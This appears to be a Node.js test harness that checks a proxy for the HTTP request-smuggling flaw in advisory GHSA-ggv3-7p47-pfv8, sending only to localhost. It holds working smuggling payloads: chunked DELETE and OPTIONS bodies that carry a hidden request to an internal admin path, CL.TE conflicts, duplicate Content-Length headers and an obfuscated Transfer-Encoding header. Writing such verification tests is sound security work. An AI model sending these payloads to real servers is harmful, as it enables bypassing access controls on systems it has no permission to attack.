// Raw-socket request-smuggling tests for the GHSA-ggv3-7p47-pfv8 harness.
// Usage: node smuggle-tests.mjs <nextPort> <label> <backendLog> <outJson>
// Only ever connects to 127.0.0.1.
import net from "node:net";
import fs from "node:fs";

const [PORT, LABEL, BLOG, OUT] = [Number(process.argv[2]), process.argv[3], process.argv[4], process.argv[5]];
const HOST = "127.0.0.1";
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
const esc = (s) => s.replace(/\r/g, "\\r").replace(/\n/g, "\\n");

function raw(payload, waitMs = 3000) {
  return new Promise((resolve) => {
    const s = net.connect(PORT, HOST);
    let data = ""; let done = false;
    const finish = (why) => { if (done) return; done = true; s.destroy(); resolve({ data, closedBy: why }); };
    s.on("data", (d) => (data += d.toString("latin1")));
    s.on("end", () => finish("server-closed"));
    s.on("error", (e) => finish("error:" + e.code));
    s.on("connect", () => s.write(payload));
    setTimeout(() => finish("client-timeout"), waitMs);
  });
}
const chunked = (body) => `${Buffer.byteLength(body).toString(16)}\r\n${body}\r\n0\r\n\r\n`;
const smuggled = (tag) => `GET /internal-admin-${tag} HTTP/1.1\r\nHost: 127.0.0.1\r\n\r\n`;

const T = (id, desc, payload) => ({ id, desc, payload });
const tag = (id) => `${id}-${LABEL}`;
const tests = [
  T("S1", "DELETE, Transfer-Encoding: chunked, body = a complete second request (advisory scenario)", (id) => `DELETE /backend/${tag(id)} HTTP/1.1\r\nHost: ${HOST}:${PORT}\r\nTransfer-Encoding: chunked\r\nConnection: close\r\n\r\n` + chunked(smuggled(tag(id)))),
  T("S2", "OPTIONS, Transfer-Encoding: chunked, body = a complete second request (advisory scenario)", (id) => `OPTIONS /backend/${tag(id)} HTTP/1.1\r\nHost: ${HOST}:${PORT}\r\nTransfer-Encoding: chunked\r\nConnection: close\r\n\r\n` + chunked(smuggled(tag(id)))),
  T("S3", "POST, Transfer-Encoding: chunked, same body (control: POST is not in the vulnerable code path)", (id) => `POST /backend/${tag(id)} HTTP/1.1\r\nHost: ${HOST}:${PORT}\r\nTransfer-Encoding: chunked\r\nConnection: close\r\n\r\n` + chunked(smuggled(tag(id)))),
  T("S4", "DELETE with Content-Length body containing the same text (control: length-framed body)", (id) => { const b = smuggled(tag(id)); return `DELETE /backend/${tag(id)} HTTP/1.1\r\nHost: ${HOST}:${PORT}\r\nContent-Length: ${Buffer.byteLength(b)}\r\nConnection: close\r\n\r\n${b}`; }),
  T("S5", "DELETE without a body (baseline)", (id) => `DELETE /backend/${tag(id)} HTTP/1.1\r\nHost: ${HOST}:${PORT}\r\nConnection: close\r\n\r\n`),
  T("S6", "DELETE with BOTH Content-Length and Transfer-Encoding: chunked (CL.TE conflict)", (id) => `DELETE /backend/${tag(id)} HTTP/1.1\r\nHost: ${HOST}:${PORT}\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\nConnection: close\r\n\r\n` + chunked(smuggled(tag(id)))),
  T("S7", "DELETE with two different Content-Length headers", (id) => `DELETE /backend/${tag(id)} HTTP/1.1\r\nHost: ${HOST}:${PORT}\r\nContent-Length: 0\r\nContent-Length: 44\r\nConnection: close\r\n\r\n` + smuggled(tag(id))),
  T("S8", "OPTIONS with obfuscated header 'Transfer-Encoding : chunked' (space before colon)", (id) => `OPTIONS /backend/${tag(id)} HTTP/1.1\r\nHost: ${HOST}:${PORT}\r\nTransfer-Encoding : chunked\r\nConnection: close\r\n\r\n` + chunked(smuggled(tag(id)))),
  T("S9", "DELETE, Transfer-Encoding: chunked, keep-alive, then a normal GET on the same client connection", (id) => `DELETE /backend/${tag(id)} HTTP/1.1\r\nHost: ${HOST}:${PORT}\r\nTransfer-Encoding: chunked\r\n\r\n` + chunked(smuggled(tag(id))) + `GET /backend/${tag(id)}-follow HTTP/1.1\r\nHost: ${HOST}:${PORT}\r\nConnection: close\r\n\r\n`),
];

const readLog = () => (fs.existsSync(BLOG) ? fs.readFileSync(BLOG, "utf8").trim().split("\n").filter(Boolean).map((l) => JSON.parse(l)) : []);
const results = [];
for (const t of tests) {
  const payload = t.payload(t.id);
  const before = readLog().length;
  const r = await raw(payload);
  await sleep(1200);
  const entries = readLog().slice(before);
  const reqs = entries.filter((e) => e.event === "request");
  const responses = (r.data.match(/^HTTP\/1\.[01] \d{3}[^\r\n]*/gm) || []);
  const smuggledSeen = reqs.some((e) => e.url.startsWith(`/internal-admin-${tag(t.id)}`));
  results.push({
    id: t.id, target: LABEL, description: t.desc, request: esc(payload),
    clientResponses: responses, clientClosedBy: r.closedBy,
    backendRequests: reqs.map((e) => ({ conn: e.conn, method: e.method, url: e.url, contentLength: e.contentLength, transferEncoding: e.transferEncoding, bodyBytes: e.bodyBytes })),
    backendRaw: entries.filter((e) => e.event === "raw").map((e) => e.data),
    backendParseErrors: entries.filter((e) => e.event === "clientError").map((e) => e.code),
    smuggledRequestReachedBackend: smuggledSeen,
  });
  console.log(`${LABEL} ${t.id} client:${JSON.stringify(responses)} backend:${JSON.stringify(reqs.map((e) => `${e.method} ${e.url} cl=${e.contentLength} te=${e.transferEncoding} body=${e.bodyBytes}`))} SMUGGLED:${smuggledSeen ? "YES" : "no"}`);
}
fs.writeFileSync(OUT, JSON.stringify(results, null, 2));
